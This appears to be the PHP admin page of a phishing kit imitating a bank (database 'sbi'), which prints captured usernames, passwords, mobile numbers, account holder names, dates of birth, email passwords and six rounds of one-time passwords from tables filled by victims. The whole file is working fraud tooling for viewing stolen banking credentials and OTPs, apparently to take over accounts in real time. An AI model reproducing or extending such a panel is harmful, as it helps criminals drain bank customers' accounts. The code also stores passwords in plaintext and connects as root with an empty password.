<!DOCTYPE html>
<html>
<head>
<title>Table with database</title>
<style>
table {
border-collapse: collapse;
width: 100%;
color: #588c7e;
font-family: monospace;
font-size: 25px;
text-align: left;
}
th {
background-color: #588c7e;
color: white;
}
tr:nth-child(even) {background-color: #f2f2f2}
</style>
</head>
<body>
<table>
<tr>
<th>Id</th>
<th>Username</th>
<th>Password</th>
<th>Mobile</th>
</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";
// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `login`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["id"]. "</td><td>" . $row["username"] . "</td><td>"
. $row["password"]."</td><td>". $row["mobile"]. "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>

<table>
<tr>
<th>Id</th>
<th>1st OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>Acc Holder Name</th>
<th>DOB</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `account`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["id"]. "</td><td>" . $row["account"] . "</td><td>"
. $row["dob"]. "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>2nd OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp2`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>3rd OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp3`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>Email</th>
<th>Password</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `email`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["id"]. "</td><td>" . $row["email"] . "</td><td>"
. $row["password"]. "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>4th OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp4`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>New Password</th>
<th>New Password</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `password`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["id"]. "</td><td>" . $row["password1"] . "</td><td>"
. $row["password1"]. "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>5th OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";


// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp5`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
<table>
<tr>
<th>Id</th>
<th>6th OTP</th>

</tr>
<?php
// Connecting to the Database
$servername = "localhost";
$username = "root";
$password = "";
$database = "sbi";

// Create a connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM `otp6`";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
    echo "<tr><td>" . $row["id"]. "</td><td>" . $row["otp"]
   . "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

<hr><hr>
</body>
</html>